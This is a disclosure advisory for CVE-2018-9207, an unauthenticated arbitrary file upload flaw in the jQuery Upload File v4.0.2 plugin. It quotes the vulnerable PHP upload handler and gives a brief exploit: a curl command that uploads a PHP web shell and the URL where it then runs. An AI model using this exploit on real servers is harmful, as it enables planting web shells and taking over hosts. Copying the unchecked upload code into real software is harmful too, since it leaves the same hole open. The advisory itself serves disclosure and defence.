=== Content from www.vapidlabs.com_64de0b3a_20250125_164853.html ===


| Advisory #: 206 |
| --- |
| **Title:** Arbitrary file upload vulnerability in jQuery Upload File v4.0.2 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2018-11-02 |
| **CVE-ID:**[[CVE-2018-9207](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9207)] |
| **CWE:** CWE-434 arbitrary file upload |
| **Download Site:** <http://hayageek.com/docs/jquery-upload-file.php> |
| **Vendor:** Hayageek |
| **Vendor Notified:**  2018-11-02 |
| **Vendor Contact:** hayageek@gmail.com |
| **Advisory:** <http://www.vapidlabs.com/advisory.php?v=206> |
| **Description:** jQuery Upload File plugin provides Multiple file Uploads with progress bar.Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads. |
| **Vulnerability:**The code in https://github.com/hayageek/jquery-upload-file/blob/master/php/upload.php doesn't check for a file type or for requiring any authentication allowing a user to upload an executable file to the /uploads/ directory if it exists. if(!is\_array($\_FILES["myfile"]["name"])) //single file { $fileName = $\_FILES["myfile"]["name"]; move\_uploaded\_file($\_FILES["myfile"]["tmp\_name"],$output\_dir.$fileName); $ret[]= $fileName; } else //Multiple files, file[] { $fileCount = count($\_FILES["myfile"]["name"]); for($i=0; $i < $fileCount; $i++) { $fileName = $\_FILES["myfile"]["name"][$i]; move\_uploaded\_file($\_FILES["myfile"]["tmp\_name"][$i],$output\_dir.$fileName); $ret[]= $fileName; } |
| **Export:** [JSON](export_mitre_v4.py?id=206) [TEXT](txt.php?v=206) [XML](xml.php?s=206) |
| **Exploit Code:** ```   1. $ curl  -F  "myfile=@shell.php" "http://example.com/jquery-upload-file/php/upload.php" 2. ["shell.php"] 4. Where shell is https://github.com/lcashdol/shittyshell/blob/master/shittyshell.php 7. Shell is located http://example.com/jquery-upload-file/php/uploads/shell.php  ``` |
| **Screen Shots:** |
| **Notes:** |


